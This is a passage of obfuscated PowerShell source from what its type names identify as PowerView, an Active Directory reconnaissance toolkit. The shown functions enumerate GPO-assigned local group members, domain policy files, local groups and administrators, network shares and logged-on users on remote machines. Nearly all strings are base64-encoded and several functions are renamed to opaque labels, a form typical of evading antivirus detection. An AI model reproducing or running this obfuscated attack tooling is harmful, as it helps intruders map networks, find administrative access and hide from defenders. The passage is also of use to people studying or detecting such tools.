        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${220}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${220}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${220}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${220}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${220}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${220}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${220}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEkAZABlAG4AdABpAHQAeQA=')))]) {
            ${226} = f79 @220 -Identity ${f15} -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
            if (-not ${226}) {
                throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAEMAbwBtAHAAdQB0AGUAcgBMAG8AYwBhAGwARwByAG8AdQBwAE0AYQBwAHAAaQBuAGcAXQAgAEMAbwBtAHAAdQB0AGUAcgAgACQAewBmADEANQB9ACAAbgBvAHQAIABmAG8AdQBuAGQALgAgAFQAcgB5ACAAYQAgAGYAdQBsAGwAeQAgAHEAdQBhAGwAaQBmAGkAZQBkACAAaABvAHMAdAAgAG4AYQBtAGUALgA=')))
            }
            ForEach (${116} in ${226}) {
                ${222} = @()
                ${225} = ${116}.distinguishedname
                ${224} = ${225}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBVAD0A'))))
                if (${224} -gt 0) {
                    ${223} = ${225}.SubString(${224})
                }
                if (${223}) {
                    ${222} += f101 @220 -SearchBase ${223} -LDAPFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHAAbABpAG4AawA9ACoAKQA='))) | % {
                        sls -InputObject $_.gplink -Pattern $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABcAHsAKQB7ADAALAAxAH0AWwAwAC0AOQBhAC0AZgBBAC0ARgBdAHsAOAB9AFwALQBbADAALQA5AGEALQBmAEEALQBGAF0AewA0AH0AXAAtAFsAMAAtADkAYQAtAGYAQQAtAEYAXQB7ADQAfQBcAC0AWwAwAC0AOQBhAC0AZgBBAC0ARgBdAHsANAB9AFwALQBbADAALQA5AGEALQBmAEEALQBGAF0AewAxADIAfQAoAFwAfQApAHsAMAAsADEAfQA='))) -AllMatches | % {$_.Matches | select -ExpandProperty Value }
                    }
                }
                Write-Verbose "Enumerating the sitename for: $(${116}.dnshostname)"
                ${185} = (f95 -94 ${116}.dnshostname).SiteName
                if (${185} -and (${185} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByAA=='))))) {
                    ${222} += f100 @220 -Identity ${185} -LDAPFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHAAbABpAG4AawA9ACoAKQA='))) | % {
                        sls -InputObject $_.gplink -Pattern $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABcAHsAKQB7ADAALAAxAH0AWwAwAC0AOQBhAC0AZgBBAC0ARgBdAHsAOAB9AFwALQBbADAALQA5AGEALQBmAEEALQBGAF0AewA0AH0AXAAtAFsAMAAtADkAYQAtAGYAQQAtAEYAXQB7ADQAfQBcAC0AWwAwAC0AOQBhAC0AZgBBAC0ARgBdAHsANAB9AFwALQBbADAALQA5AGEALQBmAEEALQBGAF0AewAxADIAfQAoAFwAfQApAHsAMAAsADEAfQA='))) -AllMatches | % {$_.Matches | select -ExpandProperty Value }
                    }
                }
                ${222} | f99 @220 | sort -Property GPOName -Unique | % {
                    ${219} = $_
                    if(${219}.GroupMembers) {
                        ${221} = ${219}.GroupMembers
                    }
                    else {
                        ${221} = ${219}.GroupSID
                    }
                    ${221} | % {
                        $Object = f98 @220 -Identity $_
                        ${206} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADYA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADcA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADMA')))) -contains $Object.samaccounttype
                        ${218} = New-Object PSObject
                        ${218} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${116}.dnshostname
                        ${218} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) $Object.samaccountname
                        ${218} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname
                        ${218} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) $_
                        ${218} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${206}
                        ${218} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) ${219}.GPODisplayName
                        ${218} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARwB1AGkAZAA='))) ${219}.GPOName
                        ${218} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) ${219}.GPOPath
                        ${218} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) ${219}.GPOType
                        ${218}.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBDAG8AbQBwAHUAdABlAHIATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgA='))))
                        ${218}
                    }
                }
            }
        }
    }
}
function Get-DomainPolicyData {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Source', 'Name')]
        [String]
        $Policy = 'Domain',
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${48} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${217} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${217}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${217}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
            ${217}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
        }
        if ($Policy -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA')))) {
            ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = '*'
        }
        elseif ($Policy -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))) {
            ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAzADEAQgAyAEYAMwA0ADAALQAwADEANgBEAC0AMQAxAEQAMgAtADkANAA1AEYALQAwADAAQwAwADQARgBCADkAOAA0AEYAOQB9AA==')))
        }
        elseif (($Policy -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcgA=')))) -or ($Policy -eq 'DC')) {
            ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewA2AEEAQwAxADcAOAA2AEMALQAwADEANgBGAC0AMQAxAEQAMgAtADkANAA1AEYALQAwADAAQwAwADQARgBCADkAOAA0AEYAOQB9AA==')))
        }
        else {
            ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Policy
        }
        ${216} = f97 @48
        ForEach (${28} in ${216}) {
            ${215} = ${28}.gpcfilesyspath + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABNAEEAQwBIAEkATgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAUwBlAGMARQBkAGkAdABcAEcAcAB0AFQAbQBwAGwALgBpAG4AZgA=')))
            ${214} =  @{
                'GptTmplPath' = ${215}
                'OutputObject' = $True
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${214}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            f96 @214 | % {
                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ATgBhAG0AZQA='))) ${28}.name
                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) ${28}.displayname
                $_
            }
        }
    }
}
function Get-NetLocalGroup {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroup.API')]
    [OutputType('PowerView.LocalGroup.WinNT')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${94} = ${Env:94},
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${85} = f77 -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${116} in ${94}) {
            if ($Method -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))) {
                ${203} = 1
                ${59} = [IntPtr]::Zero
                ${200} = 0
                ${202} = 0
                ${201} = 0
                ${58} = ${6}::NetLocalGroupEnum(${116}, ${203}, [ref]${59}, -1, [ref]${200}, [ref]${202}, [ref]${201})
                ${f1} = ${59}.ToInt64()
                if ((${58} -eq 0) -and (${f1} -gt 0)) {
                    ${65} = ${16}::GetSize()
                    for (${67} = 0; (${67} -lt ${200}); ${67}++) {
                        ${66} = New-Object System.Intptr -ArgumentList ${f1}
                        ${61} = ${66} -as ${16}
                        ${f1} = ${66}.ToInt64()
                        ${f1} += ${65}
                        $LocalGroup = New-Object PSObject
                        $LocalGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${116}
                        $LocalGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${61}.lgrpi1_name
                        $LocalGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBlAG4AdAA='))) ${61}.lgrpi1_comment
                        $LocalGroup.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AYwBhAGwARwByAG8AdQBwAC4AQQBQAEkA'))))
                        $LocalGroup
                    }
                    $Null = ${6}::NetApiBufferFree(${59})
                }
                else {
                    Write-Verbose "[Get-NetLocalGroup] Error: $(([ComponentModel.Win32Exception] ${58}).Message)"
                }
            }
            else {
                ${213} = [ADSI]$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4ATgBUADoALwAvACQAewAxADEANgB9ACwAYwBvAG0AcAB1AHQAZQByAA==')))
                ${213}.psbase.children | ? { $_.psbase.schemaClassName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA=='))) } | % {
                    $LocalGroup = ([ADSI]$_)
                    ${212} = New-Object PSObject
                    ${212} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${116}
                    ${212} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ($LocalGroup.InvokeGet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA=')))))
                    ${212} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA'))) ((New-Object System.Security.Principal.SecurityIdentifier($LocalGroup.InvokeGet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA')))),0)).Value)
                    ${212} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBlAG4AdAA='))) ($LocalGroup.InvokeGet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA==')))))
                    ${212}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AYwBhAGwARwByAG8AdQBwAC4AVwBpAG4ATgBUAA=='))))
                    ${212}
                }
            }
        }
    }
    END {
        if (${85}) {
            f75 -f2 ${85}
        }
    }
}
function f78 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${94} = ${Env:94},
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${45} = 'Administrators',
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${85} = f77 -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${116} in ${94}) {
            if ($Method -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))) {
                ${203} = 2
                ${59} = [IntPtr]::Zero
                ${200} = 0
                ${202} = 0
                ${201} = 0
                ${58} = ${6}::NetLocalGroupGetMembers(${116}, ${45}, ${203}, [ref]${59}, -1, [ref]${200}, [ref]${202}, [ref]${201})
                ${f1} = ${59}.ToInt64()
                ${210} = @()
                if ((${58} -eq 0) -and (${f1} -gt 0)) {
                    ${65} = ${15}::GetSize()
                    for (${67} = 0; (${67} -lt ${200}); ${67}++) {
                        ${66} = New-Object System.Intptr -ArgumentList ${f1}
                        ${61} = ${66} -as ${15}
                        ${f1} = ${66}.ToInt64()
                        ${f1} += ${65}
                        ${62} = ''
                        ${197} = ${5}::ConvertSidToStringSid(${61}.lgrmi2_sid, [ref]${62});${64} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if (${197} -eq 0) {
                            Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] ${64}).Message)"
                        }
                        else {
                            ${204} = New-Object PSObject
                            ${204} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${116}
                            ${204} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${45}
                            ${204} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) ${61}.lgrmi2_domainandname
                            ${204} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA'))) ${62}
                            ${206} = $(${61}.lgrmi2_sidusage -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGQAVAB5AHAAZQBHAHIAbwB1AHAA'))))
                            ${204} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${206}
                            ${204}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AYwBhAGwARwByAG8AdQBwAE0AZQBtAGIAZQByAC4AQQBQAEkA'))))
                            ${210} += ${204}
                        }
                    }
                    $Null = ${6}::NetApiBufferFree(${59})
                    ${211} = ${210} | ? {$_.SID -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAqAC0ANQAwADAA'))) -or ($_.SID -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAqAC0ANQAwADEA'))))} | select -Expand SID
                    if (${211}) {
                        ${211} = ${211}.Substring(0, ${211}.LastIndexOf('-'))
                        ${210} | % {
                            if ($_.SID -match ${211}) {
                                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $False
                            }
                            else {
                                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $True
                            }
                        }
                    }
                    else {
                        ${210} | % {
                            if ($_.SID -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAA==')))) {
                                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $False
                            }
                            else {
                                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
                            }
                        }
                    }
                    ${210}
                }
                else {
                    Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] ${58}).Message)"
                }
            }
            else {
                try {
                    ${209} = [ADSI]$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4ATgBUADoALwAvACQAewAxADEANgB9AC8AJAB7ADQANQB9ACwAZwByAG8AdQBwAA==')))
                    ${209}.psbase.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIAcwA=')))) | % {
                        ${204} = New-Object PSObject
                        ${204} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${116}
                        ${204} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${45}
                        ${207} = ([ADSI]$_)
                        ${208} = ${207}.InvokeGet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAHMAUABhAHQAaAA=')))).Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4ATgBUADoALwAvAA=='))), '')
                        ${206} = (${207}.SchemaClassName -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA=='))))
                        if(([regex]::Matches(${208}, '/')).count -eq 1) {
                            ${205} = $True
                            $Name = ${208}.Replace('/', '\')
                        }
                        else {
                            ${205} = $False
                            $Name = ${208}.Substring(${208}.IndexOf('/')+1).Replace('/', '\')
                        }
                        ${204} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAbwB1AG4AdABOAGEAbQBlAA=='))) $Name
                        ${204} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA'))) ((New-Object System.Security.Principal.SecurityIdentifier(${207}.InvokeGet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA')))),0)).Value)
                        ${204} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${206}
                        ${204} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) ${205}
                        ${204}
                    }
                }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAE4AZQB0AEwAbwBjAGEAbABHAHIAbwB1AHAATQBlAG0AYgBlAHIAXQAgAEUAcgByAG8AcgAgAGYAbwByACAAJAB7ADEAMQA2AH0AIAA6ACAAJABfAA==')))
                }
            }
        }
    }
    END {
        if (${85}) {
            f75 -f2 ${85}
        }
    }
}
function f82 {
    [OutputType('PowerView.ShareInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${94} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${85} = f77 -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${116} in ${94}) {
            ${203} = 1
            ${59} = [IntPtr]::Zero
            ${200} = 0
            ${202} = 0
            ${201} = 0
            ${58} = ${6}::NetShareEnum(${116}, ${203}, [ref]${59}, -1, [ref]${200}, [ref]${202}, [ref]${201})
            ${f1} = ${59}.ToInt64()
            if ((${58} -eq 0) -and (${f1} -gt 0)) {
                ${65} = ${19}::GetSize()
                for (${67} = 0; (${67} -lt ${200}); ${67}++) {
                    ${66} = New-Object System.Intptr -ArgumentList ${f1}
                    ${61} = ${66} -as ${19}
                    ${99} = ${61} | select *
                    ${99} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${116}
                    ${99}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBTAGgAYQByAGUASQBuAGYAbwA='))))
                    ${f1} = ${66}.ToInt64()
                    ${f1} += ${65}
                    ${99}
                }
                $Null = ${6}::NetApiBufferFree(${59})
            }
            else {
                Write-Verbose "[Get-NetShare] Error: $(([ComponentModel.Win32Exception] ${58}).Message)"
            }
        }
    }
    END {
        if (${85}) {
            f75 -f2 ${85}
        }
    }
}
function f88 {
    [OutputType('PowerView.LoggedOnUserInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${94} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${85} = f77 -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${116} in ${94}) {
            ${203} = 1
            ${59} = [IntPtr]::Zero
            ${200} = 0
            ${202} = 0
            ${201} = 0
            ${58} = ${6}::NetWkstaUserEnum(${116}, ${203}, [ref]${59}, -1, [ref]${200}, [ref]${202}, [ref]${201})
            ${f1} = ${59}.ToInt64()
            if ((${58} -eq 0) -and (${f1} -gt 0)) {
                ${65} = ${18}::GetSize()
                for (${67} = 0; (${67} -lt ${200}); ${67}++) {
                    ${66} = New-Object System.Intptr -ArgumentList ${f1}
                    ${61} = ${66} -as ${18}
                    ${121} = ${61} | select *
                    ${121} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${116}
                    ${121}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AZwBnAGUAZABPAG4AVQBzAGUAcgBJAG4AZgBvAA=='))))
                    ${f1} = ${66}.ToInt64()
                    ${f1} += ${65}
                    ${121}
                }
                $Null = ${6}::NetApiBufferFree(${59})
            }
            else {
